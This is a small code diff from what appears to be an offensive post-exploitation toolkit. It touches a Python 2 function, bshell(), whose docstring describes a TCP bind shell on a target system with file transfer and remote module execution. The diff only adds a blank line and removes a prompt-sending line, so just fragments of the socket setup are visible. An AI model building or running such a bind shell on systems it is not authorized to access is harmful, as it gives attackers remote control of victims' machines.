@@ -1,3 +1,4 @@
+
 def bshell():
     '''
     @description: Starts a TCP bind shell on the target system. Interactive shell with download/upload, cd and ability to execute other modules remotely."
@@ -12,7 +13,6 @@ def bshell():
         server.bind((HOST, PORT))
         server.listen(10)
         conn, addr = server.accept()
-        conn.send("\nIntersect "+str(os.getcwd())+" => ")
     except:
         print "[!] Connection closed."
         sys.exit(2)
